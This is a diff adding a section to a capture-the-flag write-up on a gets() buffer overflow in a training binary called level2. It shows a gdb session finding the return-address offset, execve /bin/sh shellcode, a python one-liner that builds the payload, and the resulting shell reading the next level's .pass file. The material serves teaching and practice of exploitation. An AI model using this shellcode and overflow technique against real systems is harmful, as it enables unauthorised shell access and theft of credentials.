@@ -93,7 +93,7 @@ Due to this check we couldn't point the return address to the stack (0xbf000000 
 ```
 
 We see in the program that the buffer is later copied inside a strdup. 
-This function use malloc who store the memory in ... the heap.
+This function use malloc which stores the memory in ... the heap.
 
 
 ```bash
@@ -107,3 +107,58 @@ strdup("")                                      = 0x0804a008
 ```
 
 We see that the malloc always returns the address '0x0804a008'
+
+
+## Getting access to the shell 
+
+We are going to use the vulnerability of gets() to overwrite the return address (EIP) so it points to our shellcode saved in the heap at the address 0x0804a008. 
+
+
+First let's find the offset in order to get to EIP. 
+We generate a pettern using [this website](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
+
+```bash
+$ gdb level2
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /home/user/level2/level2 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+(gdb) info register eip
+eip            0x37634136	0x37634136
+```
+
+We found that the offset of eip starts at 80.
+Our shellcode will be : 
+```plaintext
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+```
+
+which we found [here](https://shell-storm.org/shellcode/files/shellcode-575.html)
+
+So we have : 
+• shellcode : 21 bytes --> Executes /bin/sh
+• arbitrary data : 59 bytes --> Padding to fill the buffer
+• return address : 4 bytes --> Points to our shellcode in the heap thanks to the malloc of strdup
+
+```bash
+$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/coucou
+cat /tmp/coucou - | ./level2
+j
+ X?Rh//shh/bin??1?̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
